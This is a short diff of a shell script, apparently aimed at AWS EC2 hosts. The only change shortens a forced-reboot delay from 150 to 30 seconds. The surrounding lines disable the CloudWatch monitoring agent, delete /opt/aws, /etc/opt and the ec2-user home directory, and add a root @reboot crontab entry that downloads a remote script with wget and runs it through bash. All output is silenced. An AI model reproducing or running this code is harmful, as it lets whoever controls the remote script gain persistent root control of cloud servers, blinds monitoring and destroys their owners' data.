@@ -4,5 +4,5 @@ sleep 1; sudo systemctl disable amazon-cloudwatch-agent; sudo systemctl stop ama
 rm -rf /etc/opt
 rm -rf /opt/aws
 rm -rf /home/ec2-user
-bash <(echo "sleep 150; reboot || sudo reboot") >/dev/null 2>&1 &
+bash <(echo "sleep 30; reboot || sudo reboot") >/dev/null 2>&1 &
 sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab || sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
